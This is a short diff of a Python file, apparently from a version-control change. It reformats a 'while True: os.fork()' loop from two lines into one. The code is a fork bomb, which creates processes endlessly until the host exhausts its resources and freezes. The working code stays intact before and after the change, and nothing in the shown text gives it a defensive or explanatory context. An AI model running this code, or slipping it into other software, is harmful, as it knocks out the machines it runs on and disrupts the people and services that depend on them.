@@ -2,5 +2,4 @@
 
 import os
 
-while True:
-  os.fork()
+while True: os.fork()
